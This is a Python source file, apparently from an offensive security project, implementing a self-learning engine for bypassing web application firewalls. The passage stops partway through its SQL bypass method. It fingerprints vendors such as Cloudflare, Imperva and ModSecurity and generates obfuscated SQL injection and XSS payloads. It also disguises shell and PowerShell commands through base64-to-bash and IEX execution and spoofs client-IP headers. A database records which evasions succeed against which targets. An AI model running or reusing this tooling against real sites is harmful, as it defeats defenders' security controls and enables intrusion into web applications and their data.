"""DRAKBEN ENTERPRISE WAF BYPASS ENGINE v2.0

The most advanced WAF bypass engine for autonomous penetration testing.
Features:
- WAF Fingerprinting (Cloudflare, AWS WAF, ModSecurity, Imperva, Akamai, F5, Barracuda)
- Adaptive Mutation Engine (learns from failures)
- Multi-layer URL Encoding (double/triple/mixed)
- Unicode Normalization Attacks (UTF-8/UTF-16/UTF-32 exploits)
- HTTP/2 Request Smuggling
- Chunked Transfer Encoding Bypass
- HTTP Parameter Pollution (HPP)
- JSON/XML Smuggling
- Scientific Notation SQL Bypass
- Protocol-level Evasion

Author: @ahmetdrak
"""

from __future__ import annotations

import base64
import binascii
import hashlib
import json
import re
import secrets
import sqlite3
import threading
import time
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any

# =============================================================================
# WAF TYPES & DETECTION SIGNATURES
# =============================================================================


class WAFType(Enum):
    """Known WAF types with detection priority."""

    UNKNOWN = auto()
    CLOUDFLARE = auto()
    AWS_WAF = auto()
    MODSECURITY = auto()
    IMPERVA = auto()
    AKAMAI = auto()
    F5_BIG_IP = auto()
    BARRACUDA = auto()
    SUCURI = auto()
    FORTINET = auto()
    CITRIX = auto()
    RADWARE = auto()
    COMODO = auto()
    WORDFENCE = auto()  # WordPress
    NGINX_NAXSI = auto()


class PayloadType(Enum):
    """Payload type classification for bypass generation."""

    SQLI = auto()
    XSS = auto()
    RCE = auto()
    LFI = auto()
    SSTI = auto()
    XXE = auto()
    SSRF = auto()
    PATH_TRAVERSAL = auto()


@dataclass
class WAFSignature:
    """WAF detection signature."""

    waf_type: WAFType
    headers: dict[str, str] = field(default_factory=dict)
    cookies: list[str] = field(default_factory=list)
    body_patterns: list[str] = field(default_factory=list)
    status_codes: list[int] = field(default_factory=list)
    server_header: str = ""
    confidence: float = 0.0


# WAF Signatures Database
WAF_SIGNATURES: dict[WAFType, WAFSignature] = {
    WAFType.CLOUDFLARE: WAFSignature(
        waf_type=WAFType.CLOUDFLARE,
        headers={
            "cf-ray": "",
            "cf-cache-status": "",
            "cf-request-id": "",
            "server": "cloudflare",
        },
        cookies=["__cfduid", "__cf_bm", "cf_clearance"],
        body_patterns=[
            "Attention Required! | Cloudflare",
            "cloudflare-nginx",
            "Ray ID:",
            "Please enable cookies",
            "Error 1020",
        ],
        status_codes=[403, 503, 520, 521, 522, 523, 524],
        server_header="cloudflare",
    ),
    WAFType.AWS_WAF: WAFSignature(
        waf_type=WAFType.AWS_WAF,
        headers={"x-amzn-requestid": "", "x-amz-cf-id": "", "x-amz-apigw-id": ""},
        cookies=["awsalb", "awsalbcors", "AWSALB"],
        body_patterns=[
            "Request blocked",
            "AWS WAF",
            "Access Denied",
        ],
        status_codes=[403, 400],
    ),
    WAFType.MODSECURITY: WAFSignature(
        waf_type=WAFType.MODSECURITY,
        headers={"server": ""},
        body_patterns=[
            "ModSecurity",
            "mod_security",
            "NOYB",
            "This error was generated by Mod_Security",
            "rules triggered",
            "Request forbidden by administrative rules",
        ],
        status_codes=[403, 406, 501],
    ),
    WAFType.IMPERVA: WAFSignature(
        waf_type=WAFType.IMPERVA,
        headers={"x-iinfo": "", "x-cdn": "Imperva"},
        cookies=["incap_ses_", "visid_incap_", "nlbi_"],
        body_patterns=[
            "Incapsula incident ID",
            "Powered by Incapsula",
            "_Incapsula_Resource",
            "Request unsuccessful",
        ],
        status_codes=[403],
    ),
    WAFType.AKAMAI: WAFSignature(
        waf_type=WAFType.AKAMAI,
        headers={"x-akamai-transformed": "", "akamai-origin-hop": ""},
        cookies=["akamai", "ak_bmsc", "bm_sv"],
        body_patterns=[
            "Access Denied",
            "AkamaiGHost",
            "Reference #",
        ],
        status_codes=[403],
        server_header="AkamaiGHost",
    ),
    WAFType.F5_BIG_IP: WAFSignature(
        waf_type=WAFType.F5_BIG_IP,
        headers={"x-wa-info": "", "x-cnection": ""},
        cookies=["TS", "BIGipServer", "F5_ST", "F5_HT_shrinked"],
        body_patterns=[
            "The requested URL was rejected",
            "F5 Networks",
            "BIG-IP",
        ],
        status_codes=[403],
        server_header="BigIP",
    ),
    WAFType.BARRACUDA: WAFSignature(
        waf_type=WAFType.BARRACUDA,
        headers={},
        cookies=["barra_counter_session", "BNI__BARRACUDA_LB_COOKIE"],
        body_patterns=[
            "Barracuda",
            "You have been blocked",
            "barra_counter_session",
        ],
        status_codes=[403],
    ),
    WAFType.SUCURI: WAFSignature(
        waf_type=WAFType.SUCURI,
        headers={"x-sucuri-id": "", "x-sucuri-cache": ""},
        cookies=["sucuri_cloudproxy_uuid"],
        body_patterns=[
            "Sucuri WebSite Firewall",
            "sucuri.net",
            "Access Denied - Sucuri Website Firewall",
        ],
        status_codes=[403],
        server_header="Sucuri/Cloudproxy",
    ),
    WAFType.FORTINET: WAFSignature(
        waf_type=WAFType.FORTINET,
        headers={"server": "FortiWeb"},
        cookies=["FORTIWAFSID"],
        body_patterns=[
            "FortiWeb",
            ".fgd_icon",
            "Server unavailable",
        ],
        status_codes=[403],
        server_header="FortiWeb",
    ),
    WAFType.WORDFENCE: WAFSignature(
        waf_type=WAFType.WORDFENCE,
        headers={},
        cookies=["wfwaf-authcookie"],
        body_patterns=[
            "Generated by Wordfence",
            "Wordfence",
            "Your access to this site has been limited",
            "wordfence",
        ],
        status_codes=[403],
    ),
    WAFType.NGINX_NAXSI: WAFSignature(
        waf_type=WAFType.NGINX_NAXSI,
        headers={"server": "nginx"},
        body_patterns=[
            "NAXSI",
            "blocked by NAXSI",
        ],
        status_codes=[403],
    ),
}


# =============================================================================
# ADAPTIVE MUTATION MEMORY
# =============================================================================

# Database constants
DEFAULT_DB_PATH = "waf_evolution.db"
MEMORY_DB_PATH = ":memory:"


@dataclass
class PayloadAttempt:
    """Record of a payload attempt."""

    payload_hash: str
    original_payload: str
    mutated_payload: str
    mutation_type: str
    waf_type: WAFType
    target: str
    success: bool
    response_code: int
    timestamp: float
    context: str = ""  # e.g., "sqli", "xss", "rce"


class AdaptiveMutationMemory:
    """Persistent memory for learning WAF bypass patterns.

    Learns:
    - Which mutations work against which WAFs
    - Payload patterns that get blocked
    - Successful bypass sequences
    """

    def __init__(self, db_path: str = DEFAULT_DB_PATH) -> None:
        self.db_path = db_path
        self._is_memory = db_path == MEMORY_DB_PATH
        self._lock = threading.Lock()
        self._conn: sqlite3.Connection | None = None
        self._init_database()

    def _get_connection(self) -> sqlite3.Connection:
        """Get database connection, reusing for in-memory databases."""
        if self._is_memory:
            if self._conn is None:
                self._conn = sqlite3.connect(MEMORY_DB_PATH, check_same_thread=False)
            return self._conn
        return sqlite3.connect(self.db_path, timeout=10.0)

    def _init_database(self) -> None:
        """Initialize SQLite database for adaptive learning."""
        with self._lock:
            conn = self._get_connection()
            conn.execute(
                """
                CREATE TABLE IF NOT EXISTS payload_attempts (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    payload_hash TEXT NOT NULL,
                    original_payload TEXT,
                    mutated_payload TEXT,
                    mutation_type TEXT,
                    waf_type TEXT,
                    target TEXT,
                    success INTEGER,
                    response_code INTEGER,
                    timestamp REAL,
                    context TEXT
                )
            """,
            )
            conn.execute(
                """
                CREATE TABLE IF NOT EXISTS mutation_scores (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    waf_type TEXT NOT NULL,
                    mutation_type TEXT NOT NULL,
                    context TEXT NOT NULL,
                    success_count INTEGER DEFAULT 0,
                    failure_count INTEGER DEFAULT 0,
                    score REAL DEFAULT 0.5,
                    last_updated REAL,
                    UNIQUE(waf_type, mutation_type, context)
                )
            """,
            )
            conn.execute(
                """
                CREATE TABLE IF NOT EXISTS blocked_patterns (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    waf_type TEXT NOT NULL,
                    pattern_hash TEXT NOT NULL,
                    pattern TEXT,
                    block_count INTEGER DEFAULT 1,
                    last_blocked REAL,
                    UNIQUE(waf_type, pattern_hash)
                )
            """,
            )
            conn.execute(
                "CREATE INDEX IF NOT EXISTS idx_payload_hash ON payload_attempts(payload_hash)",
            )
            conn.execute(
                "CREATE INDEX IF NOT EXISTS idx_waf_mutation ON mutation_scores(waf_type, mutation_type)",
            )
            conn.commit()
            if not self._is_memory:
                conn.close()

    def record_attempt(self, attempt: PayloadAttempt) -> None:
        """Record a payload attempt and update scores."""
        with self._lock:
            conn = self._get_connection()
            try:
                # Record attempt
                conn.execute(
                    """
                    INSERT INTO payload_attempts
                    (payload_hash, original_payload, mutated_payload, mutation_type,
                     waf_type, target, success, response_code, timestamp, context)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """,
                    (
                        attempt.payload_hash,
                        attempt.original_payload,
                        attempt.mutated_payload,
                        attempt.mutation_type,
                        attempt.waf_type.name,
                        attempt.target,
                        1 if attempt.success else 0,
                        attempt.response_code,
                        attempt.timestamp,
                        attempt.context,
                    ),
                )

                # Update mutation score
                if attempt.success:
                    conn.execute(
                        """
                        INSERT INTO mutation_scores
                        (waf_type, mutation_type, context, success_count, score, last_updated)
                        VALUES (?, ?, ?, 1, 0.6, ?)
                        ON CONFLICT(waf_type, mutation_type, context) DO UPDATE SET
                        success_count = success_count + 1,
                        score = MIN(1.0, score + 0.1),
                        last_updated = ?
                    """,
                        (
                            attempt.waf_type.name,
                            attempt.mutation_type,
                            attempt.context,
                            time.time(),
                            time.time(),
                        ),
                    )
                else:
                    # Record blocked pattern
                    pattern_hash = hashlib.md5(
                        attempt.mutated_payload.encode(),
                    ).hexdigest()
                    conn.execute(
                        """
                        INSERT INTO blocked_patterns (waf_type, pattern_hash, pattern, last_blocked)
                        VALUES (?, ?, ?, ?)
                        ON CONFLICT(waf_type, pattern_hash) DO UPDATE SET
                        block_count = block_count + 1,
                        last_blocked = ?
                    """,
                        (
                            attempt.waf_type.name,
                            pattern_hash,
                            attempt.mutated_payload[:500],
                            time.time(),
                            time.time(),
                        ),
                    )

                    conn.execute(
                        """
                        INSERT INTO mutation_scores
                        (waf_type, mutation_type, context, failure_count, score, last_updated)
                        VALUES (?, ?, ?, 1, 0.4, ?)
                        ON CONFLICT(waf_type, mutation_type, context) DO UPDATE SET
                        failure_count = failure_count + 1,
                        score = MAX(0.0, score - 0.05),
                        last_updated = ?
                    """,
                        (
                            attempt.waf_type.name,
                            attempt.mutation_type,
                            attempt.context,
                            time.time(),
                            time.time(),
                        ),
                    )

                conn.commit()
            finally:
                if not self._is_memory:
                    conn.close()

    def get_best_mutations(
        self, waf_type: WAFType, context: str, limit: int = 5,
    ) -> list[tuple[str, float]]:
        """Get best mutation types for a specific WAF and context."""
        with self._lock:
            conn = self._get_connection()
            try:
                cursor = conn.execute(
                    """
                    SELECT mutation_type, score
                    FROM mutation_scores
                    WHERE waf_type = ? AND context = ?
                    ORDER BY score DESC
                    LIMIT ?
                """,
                    (waf_type.name, context, limit),
                )
                return cursor.fetchall()
            finally:
                if not self._is_memory:
                    conn.close()

    def is_pattern_blocked(self, waf_type: WAFType, payload: str) -> bool:
        """Check if a pattern is known to be blocked."""
        pattern_hash = hashlib.md5(payload.encode()).hexdigest()
        with self._lock:
            conn = self._get_connection()
            try:
                cursor = conn.execute(
                    """
                    SELECT block_count FROM blocked_patterns
                    WHERE waf_type = ? AND pattern_hash = ?
                """,
                    (waf_type.name, pattern_hash),
                )
                row = cursor.fetchone()
                return row is not None and row[0] >= 3
            finally:
                if not self._is_memory:
                    conn.close()

    def get_stats(self) -> dict[str, Any]:
        """Get learning statistics."""
        with self._lock:
            conn = self._get_connection()
            try:
                stats = {}
                cursor = conn.execute("SELECT COUNT(*) FROM payload_attempts")
                row = cursor.fetchone()
                stats["total_attempts"] = row[0] if row else 0

                cursor = conn.execute(
                    "SELECT COUNT(*) FROM payload_attempts WHERE success = 1",
                )
                row = cursor.fetchone()
                stats["successful_bypasses"] = row[0] if row else 0

                cursor = conn.execute("SELECT COUNT(*) FROM blocked_patterns")
                row = cursor.fetchone()
                stats["known_blocked_patterns"] = row[0] if row else 0

                cursor = conn.execute(
                    """
                    SELECT waf_type, mutation_type, score
                    FROM mutation_scores
                    ORDER BY score DESC
                    LIMIT 10
                """,
                )
                stats["top_mutations"] = cursor.fetchall()

                return stats
            finally:
                if not self._is_memory:
                    conn.close()

    def close(self) -> None:
        """Close the database connection."""
        with self._lock:
            if self._conn is not None:
                self._conn.close()
                self._conn = None

    def __del__(self) -> None:
        """Ensure database connection is closed on garbage collection."""
        try:
            self.close()
        except (sqlite3.Error, OSError):
            pass

    def __enter__(self) -> AdaptiveMutationMemory:
        """Support usage as a context manager."""
        return self

    def __exit__(self, *exc: object) -> None:
        """Close connection on context-manager exit."""
        self.close()


# =============================================================================
# ENCODING TECHNIQUES
# =============================================================================


class EncodingEngine:
    """Multi-layer encoding engine for WAF bypass."""

    @staticmethod
    def url_encode(payload: str, level: int = 1) -> str:
        """URL encode with multiple levels.

        Level 1: Standard %XX encoding
        Level 2: Double encoding %25XX
        Level 3: Triple encoding %2525XX
        """
        result = payload
        for _ in range(level):
            result = urllib.parse.quote(result, safe="")
        return result

    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL encoding: ' -> %27 -> %2527"""
        return EncodingEngine.url_encode(payload, level=2)

    @staticmethod
    def triple_url_encode(payload: str) -> str:
        """Triple URL encoding for deep inspection bypass."""
        return EncodingEngine.url_encode(payload, level=3)

    @staticmethod
    def mixed_encoding(payload: str) -> str:
        """Mixed encoding: some chars URL encoded, some hex, some unicode."""
        result = []
        for char in payload:
            choice = secrets.randbelow(4)
            if choice == 0:
                result.append(urllib.parse.quote(char, safe=""))
            elif choice == 1:
                result.append(f"&#x{ord(char):02x};")
            elif choice == 2:
                result.append(f"\\u{ord(char):04x}")
            else:
                result.append(char)
        return "".join(result)

    @staticmethod
    def unicode_encode(payload: str, encoding: str = "utf-8") -> str:
        """Unicode encoding with different representations."""
        if encoding == "utf-7":
            # UTF-7 encoding for special bypass
            return payload.encode("utf-7").decode("ascii", errors="ignore")
        elif encoding == "utf-16":
            # UTF-16 with BOM
            encoded = payload.encode("utf-16")
            return "".join(f"\\x{b:02x}" for b in encoded)
        elif encoding == "fullwidth":
            # Fullwidth Unicode characters
            result = []
            for char in payload:
                if "A" <= char <= "Z":
                    result.append(chr(ord(char) - ord("A") + 0xFF21))
                elif "a" <= char <= "z":
                    result.append(chr(ord(char) - ord("a") + 0xFF41))
                elif "0" <= char <= "9":
                    result.append(chr(ord(char) - ord("0") + 0xFF10))
                else:
                    result.append(char)
            return "".join(result)
        elif encoding == "halfwidth":
            # Halfwidth Katakana variations
            return payload
        else:
            return payload

    @staticmethod
    def html_entity_encode(payload: str, use_hex: bool = False) -> str:
        """HTML entity encoding."""
        result = []
        for char in payload:
            if use_hex:
                result.append(f"&#x{ord(char):x};")
            else:
                result.append(f"&#{ord(char)};")
        return "".join(result)

    @staticmethod
    def hex_encode(payload: str) -> str:
        """Hex encoding: abc -> 0x616263"""
        return "0x" + binascii.hexlify(payload.encode()).decode()

    @staticmethod
    def null_byte_injection(payload: str) -> str:
        """Null byte injection variations."""
        variations = [
            payload + "%00",
            payload + "\x00",
            payload + "%00%00",
            "%00" + payload,
            payload.replace(" ", "%00"),
        ]
        return secrets.choice(variations)


# =============================================================================
# SQL INJECTION BYPASS TECHNIQUES
# =============================================================================


class SQLBypassEngine:
    """Advanced SQL injection bypass techniques."""

    # MySQL version-specific comments
    MYSQL_COMMENTS = [
        "/*!*/",
        "/*!50000*/",
        "/*!50001*/",
        "/*!12345*/",
        "/**/",
        "/**_**/",
        "/*--*/",
        "/*%00*/",
    ]

    # Alternative keywords
    KEYWORD_ALTERNATIVES: dict[str, list[str]] = {
        "SELECT": [
            "/*!50000SELECT*/",
            "/*!32302SELECT*/",
            "sElEcT",
            "s%65lect",
            "sel%00ect",
            "%53ELECT",
            "SELEC%54",
        ],
        "UNION": [
            "/*!50000UNION*/",
            "/*!32302UNION*/",
            "uNiOn",
            "un%69on",
            "UNI%00ON",
            "%55NION",
            "UNIO%4E",
        ],
        "FROM": [
            "/*!50000FROM*/",
            "fRoM",
            "fr%6fm",
            "FR%00OM",
            "%46ROM",
        ],
        "WHERE": [
            "/*!50000WHERE*/",
            "wHeRe",
            "wh%65re",
            "WHE%00RE",
        ],
        "AND": [
            "&&",
            "%26%26",
            "/*!50000AND*/",
            "aNd",
            "an%64",
            "%41ND",
        ],
        "OR": [
            "||",
            "%7c%7c",
            "/*!50000OR*/",
            "oR",
            "o%72",
            "%4FR",
        ],
        "ORDER BY": [
            "/*!50000ORDER*//*!50000BY*/",
            "order%23%0aby",
            "order/**/by",
        ],
        "GROUP BY": [
            "/*!50000GROUP*//*!50000BY*/",
            "group%23%0aby",
        ],
    }

    # Whitespace alternatives
    WHITESPACE_ALTERNATIVES = [
        "/**/",
        "%09",  # Tab
        "%0a",  # Newline
        "%0b",  # Vertical tab
        "%0c",  # Form feed
        "%0d",  # Carriage return
        "%a0",  # Non-breaking space
        "%20",  # Space
        "+",
        "/*comment*/",
        "/*%00*/",
        "/*!*/",
    ]

    @classmethod
    def scientific_notation(cls, number: int | str) -> str:
        """Convert numbers to scientific notation to bypass WAF.

        Example: 1 -> 1e0, 2 -> 2e0
        Useful for UNION SELECT 1,2,3 -> UNION SELECT 1e0,2e0,3e0
        """
        try:
            n = int(number)
            return f"{n}e0"
        except ValueError:
            return str(number)

    @classmethod
    def obfuscate_query(cls, query: str, level: int = 2) -> str:
        """Obfuscate SQL query with multiple techniques."""
        result = query

        # Level 1: Whitespace obfuscation
        if level >= 1:
            ws = secrets.choice(cls.WHITESPACE_ALTERNATIVES)
            result = re.sub(r"\s+", ws, result)

        # Level 2: Keyword obfuscation
        if level >= 2:
            for keyword, alternatives in cls.KEYWORD_ALTERNATIVES.items():
                if keyword.upper() in result.upper():
                    alt = secrets.choice(alternatives)
                    result = re.sub(
                        rf"\b{keyword}\b", alt, result, flags=re.IGNORECASE,
                    )

        # Level 3: Comment injection
        if level >= 3:
            comment = secrets.choice(cls.MYSQL_COMMENTS)
            words = result.split()
            if len(words) > 2:
                idx = secrets.randbelow(len(words) - 1) + 1
                words.insert(idx, comment)
            result = " ".join(words)

        return result

    @classmethod
    def json_sql_injection(cls, payload: str) -> str:
        """JSON-based SQL injection for APIs."""
        # JSON key injection
        return json.dumps({"id": payload, "$or": [{"a": payload}]})

    @classmethod
    def nested_comments(cls, payload: str) -> str:
        """Nested comment technique for MySQL."""
        # /*!UNION/*!SELECT*/
        keywords = ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR"]
        for kw in keywords:
            if kw in payload.upper():
                nested = f"/*!{kw}/*!*/"
                payload = re.sub(rf"\b{kw}\b", nested, payload, flags=re.IGNORECASE)
        return payload

    @classmethod
    def concat_bypass(cls, string: str) -> str:
        """Use CONCAT to bypass string detection.

        Example: 'admin' -> CONCAT('ad','min')
        """
        if len(string) < 4:
            return f"'{string}'"
        mid = len(string) // 2
        return f"CONCAT('{string[:mid]}','{string[mid:]}')"

    @classmethod
    def char_bypass(cls, string: str) -> str:
        """Use CHAR() function to bypass string detection.

        Example: 'admin' -> CHAR(97,100,109,105,110)
        """
        chars = ",".join(str(ord(c)) for c in string)
        return f"CHAR({chars})"


# =============================================================================
# XSS BYPASS TECHNIQUES
# =============================================================================


class XSSBypassEngine:
    """Advanced XSS bypass techniques."""

    # Event handlers that might not be filtered
    OBSCURE_EVENTS = [
        "onpointerenter",
        "onpointerleave",
        "onpointerover",
        "onpointerout",
        "onpointermove",
        "onpointerdown",
        "onpointerup",
        "ontouchstart",
        "ontouchmove",
        "ontouchend",
        "onanimationend",
        "onanimationiteration",
        "onanimationstart",
        "ontransitionend",
        "onwheel",
        "onfocusin",
        "onfocusout",
        "onauxclick",
        "oncontextmenu",
    ]

    # Tags that might bypass filters
    OBSCURE_TAGS = [
        "svg",
        "math",
        "details",
        "marquee",
        "video",
        "audio",
        "object",
        "embed",
        "iframe",
        "base",
        "link",
        "meta",
        "style",
        "template",
    ]

    @classmethod
    def svg_payload(cls, js_code: str = "alert(1)") -> str:
        """SVG-based XSS payload."""
        payloads = [
            f"<svg/onload={js_code}>",
            f"<svg onload={js_code}>",
            f'<svg/onload="{js_code}">',
            f"<svg><animate onbegin={js_code}>",
            f"<svg><set onbegin={js_code}>",
            f"<svg><script>/{js_code}//</script>",
        ]
        return secrets.choice(payloads)

    @classmethod
    def math_payload(cls, js_code: str = "alert(1)") -> str:
        """MathML-based XSS payload."""
        return f"<math><maction actiontype=statusline#{js_code}>CLICK"

    @classmethod
    def polyglot(cls) -> str:
        """XSS polyglot that works in multiple contexts."""
        return """jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcLiCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"""

    @classmethod
    def case_mutation(cls, tag: str) -> str:
        """Random case mutation for tags."""
        return "".join(
            c.upper() if secrets.choice([True, False]) else c.lower() for c in tag
        )

    @classmethod
    def tag_mutation(cls, payload: str) -> str:
        """Mutate HTML tags to bypass filters."""
        # Insert null bytes, tabs, newlines
        mutations = [
            payload.replace("<", "<\x00"),
            payload.replace("<", "<\t"),
            payload.replace("<", "<\n"),
            payload.replace(">", "\x00>"),
            payload.replace("=", "\x00="),
            payload.replace("<script", "<scr\x00ipt"),
            payload.replace("<script", "<scr\tipt"),
        ]
        return secrets.choice(mutations)


# =============================================================================
# COMMAND INJECTION BYPASS
# =============================================================================


class CommandBypassEngine:
    """OS Command injection bypass techniques."""

    @classmethod
    def bash_obfuscate(cls, cmd: str) -> str:
        """Bash command obfuscation."""
        techniques = [
            # String concatenation
            "".join(f"'{c}'" if c.isalnum() else c for c in cmd).replace("''", ""),
            # Variable interpolation
            f"c='{cmd}'; $c",
            # Base64
            f"echo {base64.b64encode(cmd.encode()).decode()} | base64 -d | bash",
            # Hex
            f"echo -e '{cls._to_hex(cmd)}' | bash",
            # Wildcard
            cls._wildcard_cmd(cmd),
            # $IFS substitution (space bypass)
            cmd.replace(" ", "${IFS}"),
            # Tab substitution
            cmd.replace(" ", "\t"),
            # Brace expansion
            cls._brace_expand(cmd),
        ]
        return secrets.choice(techniques)

    @classmethod
    def _to_hex(cls, s: str) -> str:
        """Convert string to hex escape sequence."""
        return "".join(f"\\x{ord(c):02x}" for c in s)

    @classmethod
    def _wildcard_cmd(cls, cmd: str) -> str:
        """Replace chars with wildcards where possible."""
        # /bin/cat -> /???/c?t
        result = []
        for _i, c in enumerate(cmd):
            if c.isalpha() and secrets.randbelow(3) == 0:
                result.append("?")
            else:
                result.append(c)
        return "".join(result)

    @classmethod
    def _brace_expand(cls, cmd: str) -> str:
        """Bash brace expansion."""
        words = cmd.split()
        if len(words) > 1:
            return "{" + ",".join(words) + "}"
        return cmd

    @classmethod
    def powershell_obfuscate(cls, cmd: str) -> str:
        """PowerShell obfuscation."""
        if not cmd:
            return cmd
        techniques = [
            # Tick insertion
            cmd.replace("e", "e`"),
            # String concatenation
            f"('{cmd[0]}'+'{cmd[1:]}')",
            # Base64
            f"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{base64.b64encode(cmd.encode()).decode()}'))|IEX",
            # Char array
            f"-join([char[]]({','.join(str(ord(c)) for c in cmd)}))|IEX",
        ]
        return secrets.choice(techniques)


# =============================================================================
# HTTP PROTOCOL BYPASS
# =============================================================================


class HTTPBypassEngine:
    """HTTP protocol-level bypass techniques."""

    @classmethod
    def chunked_encoding(cls, body: str) -> tuple[dict[str, str], str]:
        """Create chunked transfer encoding request.

        Returns headers and body for chunked request.
        """
        # Split body into random chunks
        chunks = []
        remaining = body
        while remaining:
            chunk_size = min(secrets.randbelow(10) + 1, len(remaining))
            chunk = remaining[:chunk_size]
            remaining = remaining[chunk_size:]
            # Chunk format: size in hex\r\n data\r\n
            chunks.append(f"{len(chunk):x}\r\n{chunk}\r\n")
        chunks.append("0\r\n\r\n")  # Final chunk

        headers = {"Transfer-Encoding": "chunked"}
        return headers, "".join(chunks)

    @classmethod
    def http_parameter_pollution(cls, params: dict[str, str]) -> str:
        """HTTP Parameter Pollution technique.

        Different servers handle duplicate params differently:
        - PHP: Takes last value
        - ASP.NET: Concatenates with comma
        - JSP: Takes first value
        """
        result = []
        for key, value in params.items():
            # Add multiple variations
            result.append(f"{key}={value}")
            result.append(f"{key}={value}")
            result.append(f"{key}[]={value}")
            result.append(f"{key}%00={value}")
        return "&".join(result)

    @classmethod
    def content_type_bypass(cls) -> list[str]:
        """Content-Type variations that might bypass WAF."""
        return [
            "application/x-www-form-urlencoded",
            "application/x-www-form-urlencoded; charset=utf-8",
            "application/x-www-form-urlencoded; charset=ibm037",
            "application/x-www-form-urlencoded; charset=utf-16",
            "multipart/form-data",
            "multipart/form-data; boundary=----",
            "text/plain",
            "application/json",
            "application/xml",
            "text/xml",
            "*/*",
        ]

    @classmethod
    def header_injection(cls, payload: str) -> dict[str, str]:
        """Headers that might help bypass WAF."""
        headers = {
            "X-Originating-IP": "127.0.0.1",
            "X-Forwarded-For": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Remote-Addr": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "True-Client-IP": "127.0.0.1",
            "X-WAF-Bypass": "true",
            "X-Custom-IP-Authorization": "127.0.0.1",
        }
        return headers


# =============================================================================
# MAIN WAF BYPASS ENGINE
# =============================================================================


class WAFBypassEngine:
    """Enterprise-grade WAF Bypass Engine with adaptive learning."""

    def __init__(self, db_path: str = DEFAULT_DB_PATH) -> None:
        self.memory = AdaptiveMutationMemory(db_path)
        self.encoding = EncodingEngine()
        self.sql_bypass = SQLBypassEngine()
        self.xss_bypass = XSSBypassEngine()
        self.cmd_bypass = CommandBypassEngine()
        self.http_bypass = HTTPBypassEngine()
        self.detected_waf: WAFType = WAFType.UNKNOWN
        self._mutation_types = [
            "url_encode",
            "double_url_encode",
            "triple_url_encode",
            "mixed_encoding",
            "unicode_fullwidth",
            "html_entity",
            "hex_encode",
            "null_byte",
            "comment_injection",
            "keyword_obfuscation",
            "whitespace_mutation",
            "case_mutation",
            "scientific_notation",
            "concat_bypass",
            "char_bypass",
            "chunked_encoding",
        ]

    @staticmethod
    def _score_headers(
        signature: WAFSignature, response_headers: dict[str, str],
    ) -> tuple[float, int]:
        """Score header matches. Returns (matches, total_checks)."""
        matches = 0.0
        total_checks = 0
        for header_name, expected_value in signature.headers.items():
            total_checks += 1
            header_value = response_headers.get(header_name.lower(), "")
            if header_value:
                matches += 2 if (expected_value and expected_value.lower() in header_value.lower()) else 1
        if signature.server_header:
            total_checks += 1
            server = response_headers.get("server", "")
            if signature.server_header.lower() in server.lower():
                matches += 2
        return matches, total_checks

    @staticmethod
    def _score_cookies_and_body(
        signature: WAFSignature, cookies: list[str], body_lower: str,
    ) -> tuple[float, int]:
        """Score cookie and body pattern matches. Returns (matches, total_checks)."""
        matches = 0.0
        total_checks = 0
        for cookie in signature.cookies:
            total_checks += 1
            if any(cookie.lower() in c.lower() for c in cookies):
                matches += 1.5
        for pattern in signature.body_patterns:
            total_checks += 1
            if pattern.lower() in body_lower:
                matches += 2
        return matches, total_checks

    def _score_waf_signature(
        self,
        signature: WAFSignature,
        response_headers: dict[str, str],
        response_body: str,
        status_code: int,
        cookies: list[str],
    ) -> float:
        """Score how well a WAF signature matches the response."""
        hdr_matches, hdr_checks = self._score_headers(signature, response_headers)
        cb_matches, cb_checks = self._score_cookies_and_body(
            signature, cookies, response_body.lower(),
        )
        total_checks = hdr_checks + cb_checks
        matches = hdr_matches + cb_matches

        if signature.status_codes:
            total_checks += 1
            if status_code in signature.status_codes:
                matches += 1

        return matches / total_checks if total_checks > 0 else 0.0

    def fingerprint_waf(
        self,
        response_headers: dict[str, str],
        response_body: str,
        status_code: int,
        cookies: list[str] | None = None,
    ) -> WAFType:
        """Fingerprint WAF from response.

        Args:
            response_headers: HTTP response headers
            response_body: Response body content
            status_code: HTTP status code
            cookies: List of cookie names

        Returns:
            Detected WAF type
        """
        cookies = cookies or []
        best_match = WAFType.UNKNOWN
        best_confidence = 0.0

        for waf_type, signature in WAF_SIGNATURES.items():
            confidence = self._score_waf_signature(
                signature, response_headers, response_body, status_code, cookies,
            )
            if confidence > best_confidence:
                best_confidence = confidence
                best_match = waf_type

        self.detected_waf = best_match
        return best_match

    def bypass_sql(
        self,
        payload: str,
        waf_type: WAFType | None = None,
        aggressiveness: int = 2,
    ) -> list[str]:
        """Generate SQLi bypass payloads.

        Args:
            payload: Original SQL injection payload
            waf_type: Detected WAF type (uses self.detected_waf if None)
            aggressiveness: 1-3 (higher = more mutations)

        Returns:
            List of mutated payloads sorted by success probability
        """
        waf = waf_type or self.detected_waf
        payloads = []

        # Get best mutations from memory
        best_mutations = self.memory.get_best_mutations(waf, "sqli")

        # Priority mutations based on learning
        priority_mutations = [m[0] for m in best_mutations] if best_mutations else []

        # Generate mutations
        mutations: list[tuple[str, str]] = []

        # Basic mutations
        mutations.append((self.sql_bypass.obfuscate_query(payload, 1), "keyword_obfuscation"))
        mutations.append((self.sql_bypass.obfuscate_query(payload, 2), "comment_injection"))
        mutations.append((self.sql_bypass.obfuscate_query(payload, 3), "full_obfuscation"))

        # Encoding mutations
        mutations.append((self.encoding.url_encode(payload), "url_encode"))
        mutations.append((self.encoding.double_url_encode(payload), "double_url_encode"))
        mutations.append((self.encoding.mixed_encoding(payload), "mixed_encoding"))
        mutations.append((self.encoding.unicode_encode(payload, "fullwidth"), "unicode_fullwidth"))

        # Advanced mutations
        mutations.append((self.sql_bypass.nested_comments(payload), "nested_comments"))

        # Scientific notation for numbers
